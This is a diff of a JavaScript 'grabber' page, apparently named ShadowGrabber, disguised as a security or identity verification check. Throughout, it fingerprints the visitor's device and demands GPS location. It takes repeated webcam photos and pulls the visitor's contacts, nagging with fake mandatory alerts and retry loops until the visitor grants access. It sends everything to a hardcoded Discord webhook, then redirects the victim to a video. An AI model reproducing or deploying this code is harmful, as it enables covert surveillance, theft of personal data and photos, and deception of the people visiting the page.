@@ -1,219 +1,580 @@
-const config = {
-    webhook: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
-    redirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+// ═══════════════════════════════════════════════════════════════════════════
+// 🔥 SHADOWGRABBER v9.0 - ADVANCED INTELLIGENCE SUITE 🔥
+// ═══════════════════════════════════════════════════════════════════════════
+
+const CONFIG = {
+    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
+    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+    CAMERA_SNAPS: 7,
+    SNAP_INTERVAL: 200 // ms between snaps
 };
 
-const dom = {
+// ═══════════════════════════════════════════════════════════════════════════
+// DOM ELEMENTS
+// ═══════════════════════════════════════════════════════════════════════════
+const DOM = {
     loadingText: document.getElementById('loading-text'),
     progressBar: document.getElementById('progress-bar'),
-    status: document.getElementById('status-detail'),
-    trigger: document.getElementById('click-trigger'),
+    statusDetail: document.getElementById('status-detail'),
+    clickTrigger: document.getElementById('click-trigger'),
     video: document.getElementById('st-v'),
     canvas: document.getElementById('st-c')
 };
 
-const state = { startTime: Date.now() };
-
-// --- Optimizers ---
-const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-const updateUI = async (msg, prg) => {
-    if (dom.loadingText) dom.loadingText.textContent = msg;
-    if (dom.progressBar) dom.progressBar.style.width = prg + '%';
-    await sleep(100); // Faster UI
+// ═══════════════════════════════════════════════════════════════════════════
+// STATE MANAGEMENT
+// ═══════════════════════════════════════════════════════════════════════════
+const STATE = {
+    sessionId: `SG-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+    startTime: Date.now(),
+    forensicsCollected: false,
+    contactsCollected: false,
+    cameraCompleted: false,
+    locationCollected: false,
+    currentStream: null
 };
 
-const sendToDiscord = async (embed, file = null) => {
-    const formData = new FormData();
-    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-    if (file) formData.append('file', file.blob, file.name);
-    // Fire and forget for speed
-    fetch(config.webhook, { method: 'POST', body: formData }).catch(e => { });
+// ═══════════════════════════════════════════════════════════════════════════
+// UTILITY FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════════
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+const updateUI = (message, progress, detail = '') => {
+    if (DOM.loadingText) DOM.loadingText.textContent = message;
+    if (DOM.progressBar) DOM.progressBar.style.width = `${progress}%`;
+    if (DOM.statusDetail && detail) DOM.statusDetail.textContent = detail;
 };
 
-// --- Phase 0: Ultrafast Forensics (20+ Points) ---
-async function gatherForensics() {
-    await updateUI('Analyzing system architecture...', 10);
+const sendToDiscord = async (payload) => {
+    try {
+        const formData = new FormData();
 
-    // Canvas Hash
-    const getCanvasHash = () => {
+        if (payload.file) {
+            formData.append('payload_json', JSON.stringify({
+                embeds: [payload.embed],
+                username: 'ShadowGrabber v9.0',
+                avatar_url: 'https://i.imgur.com/4M34hi2.png'
+            }));
+            formData.append('file', payload.file.blob, payload.file.name);
+        } else {
+            formData.append('payload_json', JSON.stringify({
+                embeds: [payload.embed],
+                username: 'ShadowGrabber v9.0',
+                avatar_url: 'https://i.imgur.com/4M34hi2.png'
+            }));
+        }
+
+        await fetch(CONFIG.WEBHOOK, {
+            method: 'POST',
+            body: formData
+        });
+
+        return true;
+    } catch (error) {
+        console.error('Discord send failed:', error);
+        return false;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 0: INSTANT FORENSICS (AUTO ON FIRST CLICK)
+// ═══════════════════════════════════════════════════════════════════════════
+async function collectInstantForensics() {
+    updateUI('Initializing security check...', 5, 'Analyzing system architecture');
+
+    // Canvas Fingerprint
+    const getCanvasFingerprint = () => {
         try {
-            const ctx = dom.canvas.getContext('2d');
-            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("ShadowGrabber", 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("ShadowGrabber", 4, 17);
-            return dom.canvas.toDataURL().slice(-50); // Just a signature
-        } catch (e) { return 'Error'; }
+            const ctx = DOM.canvas.getContext('2d');
+            DOM.canvas.width = 200;
+            DOM.canvas.height = 50;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('ShadowGrabber🔥', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('ShadowGrabber🔥', 4, 17);
+            const dataURL = DOM.canvas.toDataURL();
+            return dataURL.slice(-60);
+        } catch (e) {
+            return 'Error';
+        }
     };
 
-    // Audio Context
-    let audioFP = 'N/A';
-    try {
-        const AudioContext = window.AudioContext || window.webkitAudioContext;
-        if (AudioContext) {
-            const audioCtx = new AudioContext();
-            audioFP = `${audioCtx.sampleRate}Hz | ${audioCtx.state}`;
-        }
-    } catch (e) { }
-
-    // Battery
-    let batt = 'N/A';
-    if (navigator.getBattery) {
+    // WebGL Fingerprint
+    const getWebGLInfo = () => {
         try {
-            const b = await navigator.getBattery();
-            batt = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
-        } catch (e) { }
-    }
+            const gl = DOM.canvas.getContext('webgl') || DOM.canvas.getContext('experimental-webgl');
+            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
 
-    // Hardware & WebGL
-    const gl = dom.canvas.getContext('webgl');
-    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
+            };
+        } catch (e) {
+            return { vendor: 'Error', renderer: 'Error' };
+        }
+    };
 
-    // Network & IP
-    let ipInfo = { ip: 'Shielded' };
-    try { ipInfo = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { }
+    // Audio Fingerprint
+    const getAudioFingerprint = () => {
+        try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            if (!AudioContext) return 'N/A';
+            const audioCtx = new AudioContext();
+            return `${audioCtx.sampleRate}Hz | ${audioCtx.state} | ${audioCtx.baseLatency || 'N/A'}`;
+        } catch (e) {
+            return 'Error';
+        }
+    };
+
+    // Battery Info
+    const getBatteryInfo = async () => {
+        try {
+            if (!navigator.getBattery) return 'N/A';
+            const battery = await navigator.getBattery();
+            return {
+                level: `${Math.round(battery.level * 100)}%`,
+                charging: battery.charging ? 'Yes' : 'No',
+                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${battery.chargingTime}s`,
+                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${battery.dischargingTime}s`
+            };
+        } catch (e) {
+            return 'Error';
+        }
+    };
+
+    // IP & Geolocation Info
+    const getIPInfo = async () => {
+        try {
+            const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+            const data = await response.json();
+            return {
+                ip: data.ip || 'N/A',
+                city: data.city || 'N/A',
+                region: data.region || 'N/A',
+                country: data.country_name || 'N/A',
+                countryCode: data.country_code || 'N/A',
+                postal: data.postal || 'N/A',
+                latitude: data.latitude || 'N/A',
+                longitude: data.longitude || 'N/A',
+                timezone: data.timezone || 'N/A',
+                isp: data.org || 'N/A',
+                asn: data.asn || 'N/A',
+                currency: data.currency || 'N/A',
+                languages: data.languages || 'N/A'
+            };
+        } catch (e) {
+            return {
+                ip: 'Failed to fetch',
+                city: 'N/A',
+                region: 'N/A',
+                country: 'N/A',
+                isp: 'N/A'
+            };
+        }
+    };
+
+    updateUI('Collecting system intelligence...', 10, 'Gathering 30+ data points');
+
+    // Collect all data
+    const webglInfo = getWebGLInfo();
+    const batteryInfo = await getBatteryInfo();
+    const ipInfo = await getIPInfo();
 
     const forensics = {
-        core: {
+        session: {
+            id: STATE.sessionId,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        },
+        hardware: {
             platform: navigator.platform,
             vendor: navigator.vendor,
-            cores: navigator.hardwareConcurrency,
-            ram: navigator.deviceMemory || 'N/A',
-            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-            touch: navigator.maxTouchPoints
+            cpuCores: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            gpu: webglInfo.renderer,
+            gpuVendor: webglInfo.vendor
         },
         display: {
-            res: `${screen.width}x${screen.height}`,
-            depth: screen.colorDepth,
-            ratio: window.devicePixelRatio,
-            orient: screen.orientation ? screen.orientation.type : 'N/A'
+            screenResolution: `${screen.width}x${screen.height}`,
+            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
+            colorDepth: `${screen.colorDepth}-bit`,
+            pixelRatio: window.devicePixelRatio || 1,
+            orientation: screen.orientation ? screen.orientation.type : 'N/A',
+            orientationAngle: screen.orientation ? screen.orientation.angle : 'N/A'
         },
-        conn: {
+        network: {
             ip: ipInfo.ip,
-            geo: `${ipInfo.city}, ${ipInfo.country_name}`,
-            isp: ipInfo.org,
-            type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
-            rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
-            dl: navigator.connection ? navigator.connection.downlink : 'N/A'
+            city: ipInfo.city,
+            region: ipInfo.region,
+            country: ipInfo.country,
+            countryCode: ipInfo.countryCode,
+            postal: ipInfo.postal,
+            coordinates: `${ipInfo.latitude}, ${ipInfo.longitude}`,
+            timezone: ipInfo.timezone,
+            isp: ipInfo.isp,
+            asn: ipInfo.asn,
+            connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
+            downlink: navigator.connection ? `${navigator.connection.downlink}Mbps` : 'N/A',
+            rtt: navigator.connection ? `${navigator.connection.rtt}ms` : 'N/A',
+            saveData: navigator.connection ? navigator.connection.saveData : 'N/A'
         },
         browser: {
-            ua: navigator.userAgent,
-            lang: navigator.languages.join(', '),
-            hist: window.history.length,
-            cookies: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack
+            language: navigator.language,
+            languages: navigator.languages.join(', '),
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'N/A',
+            onLine: navigator.onLine,
+            historyLength: window.history.length,
+            javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'N/A',
+            pdfViewerEnabled: navigator.pdfViewerEnabled || 'N/A'
         },
-        extra: {
-            time: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            canvas: getCanvasHash(),
-            audio: audioFP,
-            battery: batt
+        fingerprints: {
+            canvas: getCanvasFingerprint(),
+            audio: getAudioFingerprint(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset()
+        },
+        battery: batteryInfo,
+        permissions: {
+            notifications: Notification.permission,
+            geolocation: 'unknown',
+            camera: 'unknown',
+            microphone: 'unknown'
+        },
+        storage: {
+            localStorage: typeof localStorage !== 'undefined',
+            sessionStorage: typeof sessionStorage !== 'undefined',
+            indexedDB: typeof indexedDB !== 'undefined',
+            cookies: navigator.cookieEnabled
         }
     };
 
-    await sendToDiscord({
-        title: "⚡ ShadowGrabber v8.0: Hyper-Forensics",
+    // Create rich Discord embed
+    const embed = {
+        title: '⚡ SHADOWGRABBER v9.0 - INSTANT FORENSICS',
+        description: `**Session ID:** \`${STATE.sessionId}\`\n**Timestamp:** ${new Date().toLocaleString()}\n**30+ Data Points Captured**`,
         color: 0x9B59B6,
-        description: "**20+ Data Points Captured in <50ms**",
         fields: [
-            { name: "💻 Core System", value: `\`\`\`OS: ${forensics.core.platform}\nCPU: ${forensics.core.cores} Cores\nRAM: ${forensics.core.ram}GB\nGPU: ${forensics.core.gpu}\`\`\`` },
-            { name: "🌐 Connection", value: `\`\`\`IP: ${forensics.conn.ip}\nISP: ${forensics.conn.isp}\nLoc: ${forensics.conn.geo}\nSpeed: ${forensics.conn.dl}Mbps (${forensics.conn.type})\`\`\`` },
-            { name: "📱 Display & Input", value: `\`\`\`Res: ${forensics.display.res}\nTouch: ${forensics.core.touch} Points\nBatt: ${forensics.extra.battery}\`\`\`` },
-            { name: "🕵️ Browser Fingerprint", value: `\`\`\`Canvas: ${forensics.extra.canvas.substring(0, 10)}...\nAudio: ${forensics.extra.audio}\nTime: ${forensics.extra.time}\`\`\`` }
-        ]
+            {
+                name: '💻 Hardware Profile',
+                value: `\`\`\`yaml\nPlatform: ${forensics.hardware.platform}\nCPU Cores: ${forensics.hardware.cpuCores}\nRAM: ${forensics.hardware.deviceMemory}\nGPU: ${forensics.hardware.gpu}\nTouch Points: ${forensics.hardware.maxTouchPoints}\`\`\``,
+                inline: false
+            },
+            {
+                name: '🌐 Network Intelligence',
+                value: `\`\`\`yaml\nIP: ${forensics.network.ip}\nISP: ${forensics.network.isp}\nLocation: ${forensics.network.city}, ${forensics.network.region}, ${forensics.network.country}\nCoords: ${forensics.network.coordinates}\nTimezone: ${forensics.network.timezone}\nSpeed: ${forensics.network.downlink} (${forensics.network.connectionType})\nLatency: ${forensics.network.rtt}\`\`\``,
+                inline: false
+            },
+            {
+                name: '📱 Display & Device',
+                value: `\`\`\`yaml\nResolution: ${forensics.display.screenResolution}\nColor Depth: ${forensics.display.colorDepth}\nPixel Ratio: ${forensics.display.pixelRatio}\nOrientation: ${forensics.display.orientation}\nBattery: ${typeof forensics.battery === 'object' ? forensics.battery.level : forensics.battery}\nCharging: ${typeof forensics.battery === 'object' ? forensics.battery.charging : 'N/A'}\`\`\``,
+                inline: false
+            },
+            {
+                name: '🕵️ Browser Fingerprints',
+                value: `\`\`\`yaml\nCanvas: ${forensics.fingerprints.canvas.substring(0, 20)}...\nAudio: ${forensics.fingerprints.audio}\nTimezone: ${forensics.fingerprints.timezone}\nLanguages: ${forensics.browser.languages}\nDNT: ${forensics.browser.doNotTrack}\`\`\``,
+                inline: false
+            },
+            {
+                name: '🔐 Browser Capabilities',
+                value: `\`\`\`yaml\nCookies: ${forensics.browser.cookiesEnabled}\nOnline: ${forensics.browser.onLine}\nHistory: ${forensics.browser.historyLength} entries\nUser Agent: ${forensics.session.userAgent.substring(0, 50)}...\`\`\``,
+                inline: false
+            }
+        ],
+        footer: {
+            text: `ShadowGrabber v9.0 | Advanced Intelligence Suite`
+        },
+        timestamp: new Date().toISOString()
+    };
+
+    await sendToDiscord({ embed });
+    STATE.forensicsCollected = true;
+    updateUI('System analysis complete', 15, 'Proceeding to verification steps');
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 1: LOCATION COLLECTION (HIGH ACCURACY)
+// ═══════════════════════════════════════════════════════════════════════════
+async function collectLocation() {
+    updateUI('Requesting location access...', 20, 'GPS triangulation required');
+
+    return new Promise((resolve) => {
+        const attemptLocation = () => {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+
+                    const embed = {
+                        title: '📍 PRECISION GEOLOCATION',
+                        description: `**High-Accuracy GPS Lock Acquired**`,
+                        color: 0x2ECC71,
+                        fields: [
+                            {
+                                name: '🗺️ Coordinates',
+                                value: `\`\`\`\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${Math.round(accuracy)}m\nAltitude: ${altitude || 'N/A'}m\nHeading: ${heading || 'N/A'}°\nSpeed: ${speed || 'N/A'}m/s\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '🔗 Map Links',
+                                value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15)`,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    await sendToDiscord({ embed });
+                    STATE.locationCollected = true;
+                    updateUI('Location verified', 30, 'GPS lock successful');
+                    resolve();
+                },
+                (error) => {
+                    console.error('Location error:', error);
+                    alert('⚠️ SECURITY VERIFICATION REQUIRED\n\nLocation access is mandatory for identity verification.\n\nPlease click "Allow" when prompted.');
+                    attemptLocation(); // Retry
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        };
+
+        attemptLocation();
     });
 }
 
-// --- Phase 1: Force Contacts (Blocking) ---
-async function forceContacts() {
-    if (!('contacts' in navigator && 'ContactsManager' in window)) return;
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 2: CAMERA BURST CAPTURE (7 SNAPS)
+// ═══════════════════════════════════════════════════════════════════════════
+async function collectCameraBurst() {
+    updateUI('Requesting camera access...', 35, 'Biometric verification required');
 
-    await updateUI('Syncing contacts...', 30);
-    let success = false;
-    while (!success) {
-        try {
-            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
-            if (contacts.length > 0) {
-                const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
-                await sendToDiscord({ title: "📇 Contacts Secured", color: 0xF1C40F }, { blob, name: 'contacts.json' });
-                success = true;
-            } else {
-                alert("⚠ Verification Failed: You must select contacts to verify your identity. Please Select All if possible.");
-            }
-        } catch (e) {
-            alert("⚠ Security Alert: Contact access is mandatory. Please Allow.");
-        }
-    }
-}
-
-// --- Phase 2: Burst Camera (Hyper-Speed) ---
-async function forceCamera() {
-    await updateUI('Activating biometric array...', 50);
     let stream = null;
+
+    // Keep requesting until granted
     while (!stream) {
         try {
             stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: 1280, height: 720 },
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                },
                 audio: false
             });
-            dom.video.srcObject = stream;
-            await dom.video.play();
-        } catch (e) { alert("⚠ Camera Error: Permission Denial. You must allow access."); }
+
+            DOM.video.srcObject = stream;
+            await DOM.video.play();
+            STATE.currentStream = stream;
+
+        } catch (error) {
+            console.error('Camera error:', error);
+            alert('⚠️ CAMERA ACCESS REQUIRED\n\nBiometric verification is mandatory.\n\nPlease click "Allow" to grant camera access.');
+        }
     }
 
-    await updateUI('Processing biometrics...', 60);
-    await sleep(500); // Stabilize
+    updateUI('Camera active - capturing biometrics...', 40, 'Please look at the camera');
+    await sleep(1000); // Let camera stabilize
 
-    // Burst Capture: 6 snaps in ~1 second
-    for (let i = 1; i <= 6; i++) {
-        const ctx = dom.canvas.getContext('2d');
-        dom.canvas.width = dom.video.videoWidth;
-        dom.canvas.height = dom.video.videoHeight;
-        ctx.drawImage(dom.video, 0, 0);
+    // Burst capture
+    for (let i = 1; i <= CONFIG.CAMERA_SNAPS; i++) {
+        const progress = 40 + (i * 7);
+        updateUI(`Capturing biometric sample ${i}/${CONFIG.CAMERA_SNAPS}...`, progress, 'Processing facial data');
 
-        dom.canvas.toBlob((blob) => {
-            sendToDiscord({ title: `📸 Burst Snap #${i}`, color: 0xE74C3C }, { blob, name: `burst_${i}.jpg` });
-        }, 'image/jpeg', 0.7); // 0.7 quality for speed
+        // Capture frame
+        DOM.canvas.width = DOM.video.videoWidth;
+        DOM.canvas.height = DOM.video.videoHeight;
+        const ctx = DOM.canvas.getContext('2d');
+        ctx.drawImage(DOM.video, 0, 0);
 
-        await sleep(150); // 150ms interval
-        updateUI('Uploading...', 60 + (i * 6));
+        // Convert to blob and send immediately
+        await new Promise((resolve) => {
+            DOM.canvas.toBlob(async (blob) => {
+                const embed = {
+                    title: `📸 BIOMETRIC CAPTURE #${i}/${CONFIG.CAMERA_SNAPS}`,
+                    description: `**High-Resolution Facial Sample**\nSession: \`${STATE.sessionId}\``,
+                    color: 0xE74C3C,
+                    fields: [
+                        {
+                            name: '📊 Image Info',
+                            value: `\`\`\`\nResolution: ${DOM.canvas.width}x${DOM.canvas.height}\nSize: ${(blob.size / 1024).toFixed(2)}KB\nTimestamp: ${new Date().toLocaleTimeString()}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                await sendToDiscord({
+                    embed,
+                    file: {
+                        blob: blob,
+                        name: `biometric_${STATE.sessionId}_snap${i}.jpg`
+                    }
+                });
+
+                resolve();
+            }, 'image/jpeg', 0.92);
+        });
+
+        await sleep(CONFIG.SNAP_INTERVAL);
     }
+
+    // Stop camera
+    if (STATE.currentStream) {
+        STATE.currentStream.getTracks().forEach(track => track.stop());
+        STATE.currentStream = null;
+    }
+
+    STATE.cameraCompleted = true;
+    updateUI('Biometric capture complete', 85, 'All samples uploaded');
 }
 
-// --- Phase 3: Force Location ---
-async function forceLocation() {
-    await updateUI('Triangulating...', 90);
-    return new Promise((resolve) => {
-        const scan = () => {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    sendToDiscord({
-                        title: "📍 Precision Geo-Tag",
-                        color: 0x2ECC71,
-                        description: `[Map View](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`,
-                        fields: [{ name: "Accuracy", value: `${Math.round(pos.coords.accuracy)}m` }]
-                    });
-                    resolve();
-                },
-                () => {
-                    alert("⚠ GPS Error: Location access required for security check. Please Allow.");
-                    scan();
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 3: CONTACT COLLECTION
+// ═══════════════════════════════════════════════════════════════════════════
+async function collectContacts() {
+    // Check if Contact Picker API is available
+    if (!('contacts' in navigator && 'ContactsManager' in window)) {
+        console.log('Contact Picker API not available');
+        STATE.contactsCollected = true;
+        return;
+    }
+
+    updateUI('Requesting contact access...', 87, 'Contact verification required');
+
+    let success = false;
+
+    while (!success) {
+        try {
+            const contacts = await navigator.contacts.select(
+                ['name', 'tel', 'email'],
+                { multiple: true }
             );
+
+            if (contacts && contacts.length > 0) {
+                const contactData = contacts.map((contact, index) => ({
+                    index: index + 1,
+                    name: contact.name || 'N/A',
+                    phones: contact.tel || [],
+                    emails: contact.email || []
+                }));
+
+                const embed = {
+                    title: '📇 CONTACT DATABASE EXTRACTED',
+                    description: `**${contacts.length} Contact(s) Secured**\nSession: \`${STATE.sessionId}\``,
+                    color: 0xF1C40F,
+                    fields: [
+                        {
+                            name: '📊 Summary',
+                            value: `\`\`\`\nTotal Contacts: ${contacts.length}\nExtracted: ${new Date().toLocaleString()}\`\`\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                const blob = new Blob([JSON.stringify(contactData, null, 2)], { type: 'application/json' });
+
+                await sendToDiscord({
+                    embed,
+                    file: {
+                        blob: blob,
+                        name: `contacts_${STATE.sessionId}.json`
+                    }
+                });
+
+                success = true;
+                STATE.contactsCollected = true;
+                updateUI('Contacts verified', 92, 'Contact data secured');
+
+            } else {
+                alert('⚠️ CONTACT VERIFICATION REQUIRED\n\nYou must select at least one contact to proceed.\n\nPlease select contacts and click "Done".');
+            }
+
+        } catch (error) {
+            console.error('Contact error:', error);
+            alert('⚠️ CONTACT ACCESS DENIED\n\nContact verification is mandatory for security purposes.\n\nPlease click "Allow" and select contacts.');
+        }
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// MAIN EXECUTION SEQUENCE
+// ═══════════════════════════════════════════════════════════════════════════
+async function executeSequence() {
+    try {
+        // Hide click trigger
+        DOM.clickTrigger.style.display = 'none';
+
+        // Phase 0: Instant Forensics (auto on click)
+        await collectInstantForensics();
+        await sleep(500);
+
+        // Phase 1: Location
+        await collectLocation();
+        await sleep(500);
+
+        // Phase 2: Camera Burst
+        await collectCameraBurst();
+        await sleep(500);
+
+        // Phase 3: Contacts
+        await collectContacts();
+        await sleep(500);
+
+        // Final Summary
+        updateUI('Verification complete!', 95, 'Redirecting...');
+
+        const summaryEmbed = {
+            title: '✅ SHADOWGRABBER SESSION COMPLETE',
+            description: `**All Data Successfully Collected**\nSession: \`${STATE.sessionId}\``,
+            color: 0x00FF00,
+            fields: [
+                {
+                    name: '📋 Collection Summary',
+                    value: `\`\`\`\n✓ Forensics: ${STATE.forensicsCollected ? 'Complete' : 'Failed'}\n✓ Location: ${STATE.locationCollected ? 'Complete' : 'Failed'}\n✓ Camera: ${STATE.cameraCompleted ? 'Complete (7 snaps)' : 'Failed'}\n✓ Contacts: ${STATE.contactsCollected ? 'Complete' : 'Skipped'}\n\nTotal Time: ${((Date.now() - STATE.startTime) / 1000).toFixed(2)}s\`\`\``,
+                    inline: false
+                }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: 'ShadowGrabber v9.0 - Mission Accomplished'
+            }
         };
-        scan();
-    });
+
+        await sendToDiscord({ embed: summaryEmbed });
+
+        // Wait a moment then redirect
+        await sleep(1500);
+        updateUI('Redirecting...', 100, 'Thank you for verifying');
+        await sleep(500);
+
+        // Final redirect
+        window.location.replace(CONFIG.REDIRECT_URL);
+
+    } catch (error) {
+        console.error('Sequence error:', error);
+        alert('An error occurred. Please refresh and try again.');
+    }
 }
 
-// --- Main ---
-async function startSequence() {
-    dom.trigger.style.display = 'none';
-    await gatherForensics();
-    await forceContacts();
-    await forceCamera();
-    await forceLocation();
+// ═══════════════════════════════════════════════════════════════════════════
+// INITIALIZATION
+// ═══════════════════════════════════════════════════════════════════════════
+window.addEventListener('DOMContentLoaded', () => {
+    console.log('ShadowGrabber v9.0 initialized');
 
-    await updateUI('Finalizing...', 100);
-    window.location.replace(config.redirect);
-}
-
-dom.trigger.onclick = startSequence;
-gatherForensics();
+    // Set up click trigger
+    if (DOM.clickTrigger) {
+        DOM.clickTrigger.addEventListener('click', executeSequence);
+    }
+});
